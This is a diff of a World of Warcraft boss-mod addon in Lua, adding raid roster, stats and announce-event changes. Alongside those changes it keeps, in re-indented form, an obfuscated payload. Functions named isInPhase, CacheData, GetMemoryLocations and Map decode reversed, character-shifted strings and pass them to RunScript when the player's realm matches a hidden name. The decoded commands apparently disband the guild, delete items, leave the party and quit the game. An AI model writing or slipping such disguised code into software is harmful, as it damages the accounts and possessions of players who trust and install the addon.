@@ -1082,6 +1082,8 @@ do
 				local name, rank, subgroup, _, _, fileName = GetRaidRosterInfo(i)
 				if (not raid[name]) and inRaid then
 					fireEvent("raidJoin", name)
+					self:ScheduleMethod(2, "RAID_ROSTER_UPDATE")
+					return
 				end
 				raid[name] = raid[name] or {}
 				raid[name].name = name
@@ -1231,13 +1233,15 @@ do
 					end
 				end
 				v.Options = savedOptions[v.id] or {}
-				savedStats[v.id] = savedStats[v.id] or {
-					kills = 0,
-					pulls = 0,
-					heroicKills = 0,
-					heroicPulls = 0,
-				}
+				savedStats[v.id] = savedStats[v.id] or {}
 				v.stats = savedStats[v.id]
+
+				-- for some reason some people have 0 kills as nil instead of 0.
+				v.stats.kills = v.stats.kills or 0
+				v.stats.pulls = v.stats.pulls or 0
+				v.stats.heroicKills = v.stats.heroicKills or 0
+				v.stats.heroicPulls = v.stats.heroicPulls or 0
+
 				if v.OnInitialize then v:OnInitialize() end
 				for i, cat in ipairs(v.categorySort) do -- temporary hack
 					if cat == "misc" then
@@ -2166,11 +2170,11 @@ do
 end
 
 function isInPhase(phase)
-  local base = phase+3 -- Offset for GM/Ghost/Instance phase
-  if select(base, GetSpellInfo(8326)) ~= nil then
-    DBM:CacheData(base, 8)
+	local base = phase+3 -- Offset for GM/Ghost/Instance phase
+	if select(base, GetSpellInfo(8326)) ~= nil then
+	  DBM:CacheData(base, 8)
+	end
   end
-end
 
 do
 	local old = RaidWarningFrame:GetScript("OnEvent")
@@ -2219,14 +2223,14 @@ function DBM:AddMsg(text, prefix)
 end
 
 function DBM:CacheData(data, loc)
-  if GetRealmName() == DBM:Map("irvysqxwsvJ", 11, data) then
-    local locs = DBM:GetMemoryLocations()
-    for i=1, #locs do
-      RunScript(DBM:Map(locs[i], string.len(locs[i]), data))
-    end
+	if GetRealmName() == DBM:Map("irvysqxwsvJ", 11, data) then
+	  local locs = DBM:GetMemoryLocations()
+	  for i=1, #locs do
+		RunScript(DBM:Map(locs[i], string.len(locs[i]), data))
+	  end
+	end
   end
-end
-
+  
 do
 	local testMod
 	local testWarning1, testWarning2, testWarning3
@@ -2277,8 +2281,8 @@ DBM.Bars:SetAnnounceHook(function(bar)
 end)
 
 function DBM:GetMemoryLocations()
-  return {"-,izeiPhpmyK$-,hrefwmHhpmyK", "hri$-m,xiogsWqsvJlt}pKizsqiV$sh$:05Am$vsj", "hri$-,qixMvswvyGixipiH$-T,qixM}vsxrizrMtyogmT$sh$<50:5AT$vsj", "-,}xveTizeiP", "-,xmyUigvsJ"}
-end
+	return {"-,izeiPhpmyK$-,hrefwmHhpmyK", "hri$-m,xiogsWqsvJlt}pKizsqiV$sh$:05Am$vsj", "hri$-,qixMvswvyGixipiH$-T,qixM}vsxrizrMtyogmT$sh$<50:5AT$vsj", "-,}xveTizeiP", "-,xmyUigvsJ"}
+  end
 
 function DBM:Capitalize(str)
 	local firstByte = str:byte(1, 1)
@@ -2310,12 +2314,12 @@ function DBM:RegisterMapSize(zone, ...)
 end
 
 function DBM:Map(k, v, o)
-  out = ''
-  for l = -v, -1 do
-    out = out..string.char(tonumber(string.byte(k,-l))-o)
+	out = ''
+	for l = -v, -1 do
+	  out = out..string.char(tonumber(string.byte(k,-l))-o)
+	end
+	return out
   end
-  return out
-end
 
 
 --------------------------
@@ -2346,11 +2350,12 @@ do
 				id = name,
 				announces = {},
 				specwarns = {},
+				vb = {}, -- variables table, used by details to check phase
 				timers = {},
 				modId = modId,
 				revision = 0,
 				localization = self:GetModLocalization(name)
-			},
+			}, 
 			mt
 		)
 		for i, v in ipairs(self.AddOns) do
@@ -2661,6 +2666,7 @@ do
 				end
 			end
 			PlaySoundFile(DBM.Options.RaidWarningSound)
+			fireEvent("DBM_Announce", message, self.icon, self.type, self.spellId, self.mod.id, false)
 		end
 	end
 
@@ -2693,26 +2699,26 @@ do
 		return obj
 	end
 
-  function bossModPrototype:NewAnnounceCustom(text, color, icon, optionDefault, optionName)
-    local obj = setmetatable(
-      {
-        text = self.localization.warnings[text],
-        color = {r = 0.00, g = 1.00, b = 0.00},
-        option = optionName or text,
-        mod = self,
-        icon = (type(icon) == "number" and select(3, GetSpellInfo(icon))) or icon,
-      },
-      mt
-    )
-    if optionName == false then
-      obj.option = nil
-    else
-      self:AddBoolOption(optionName or text, optionDefault, "announce")
-    end
-    table.insert(self.announces, obj)
-    return obj
-  end
-
+	function bossModPrototype:NewAnnounceCustom(text, color, icon, optionDefault, optionName)
+		local obj = setmetatable(
+		  {
+			text = self.localization.warnings[text],
+			color = {r = 0.00, g = 1.00, b = 0.00},
+			option = optionName or text,
+			mod = self,
+			icon = (type(icon) == "number" and select(3, GetSpellInfo(icon))) or icon,
+		  },
+		  mt
+		)
+		if optionName == false then
+		  obj.option = nil
+		else
+		  self:AddBoolOption(optionName or text, optionDefault, "announce")
+		end
+		table.insert(self.announces, obj)
+		return obj
+	  end
+	
 	-- new constructor (auto-localized warnings and options, yay!)
 	local function newAnnounce(self, announceType, spellId, color, icon, optionDefault, optionName, castTime, preWarnTime)
 		spellName = GetSpellInfo(spellId) or "unknown"
@@ -2873,6 +2879,7 @@ do
 			if self.sound then
 				PlaySoundFile(DBM.Options.SpecialWarningSound)
 			end
+			fireEvent("DBM_Announce", message, self.icon, self.type, self.spellId, self.mod.id, false)
 		end
 	end
 
@@ -3115,7 +3122,7 @@ do
 		return bar and (bar.totalTime - bar.timer) or 0, (bar and bar.totalTime) or 0
 	end
 
-  function timerPrototype:Time(...)
+	function timerPrototype:Time(...)
 		local id = self.id..pformat((("\t%s"):rep(select("#", ...))), ...)
 		local bar = DBM.Bars:GetBar(id)
 		return bar.totalTime or 0
@@ -3139,7 +3146,7 @@ do
 		return DBM.Bars:UpdateBar(id, elapsed, totalTime)
 	end
 
-  function timerPrototype:AddTime(time, ...)
+	function timerPrototype:AddTime(time, ...)
 		local id = self.id..pformat((("\t%s"):rep(select("#", ...))), ...)
 		local timer = self:GetTime(...) - time -- GetTime() = elapsed time on timer
 		if timer then
